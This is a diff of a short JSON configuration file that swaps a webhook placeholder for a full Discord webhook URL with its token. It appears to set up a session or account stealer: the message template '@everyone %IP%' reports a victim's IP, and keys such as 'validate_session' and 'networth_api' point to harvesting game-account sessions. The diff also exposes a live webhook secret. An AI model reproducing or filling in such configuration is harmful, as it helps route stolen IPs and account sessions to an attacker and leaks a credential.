@@ -1,6 +1,6 @@
 {
-  "webhook": "YOUR_WEBHOOK_URL_HERE",
-  "webhook_name": "webhook",
+  "webhook": "https://discord.com/api/webhooks/1454509014892281998/G3IxgdLEJvyiCvTt2cjcolWbJe-BEJfqJtqHiFm03MoewqfCCNo0ulOBlnTrnrtw-pUh",
+  "webhook_name": "ray",
   "webhook_avatar": "https://cdn.discordapp.com/embed/avatars/0.png",
   "message": "@everyone %IP%",
 
@@ -33,4 +33,5 @@
 
   "validate_session": true,
   "networth_api": ""
+
 }
